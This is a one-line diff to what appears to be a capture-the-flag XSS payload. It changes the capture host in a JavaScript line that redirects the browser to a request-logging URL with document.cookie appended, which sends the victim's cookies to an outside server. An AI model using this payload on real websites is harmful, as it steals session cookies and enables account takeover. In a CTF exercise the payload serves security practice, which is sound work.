@@ -1,1 +1,1 @@
-location.href='https://cghuatb.request.dreamhack.games?flag='.concat(document.cookie)
+location.href='https://nylfjkq.request.dreamhack.games?flag='.concat(document.cookie)
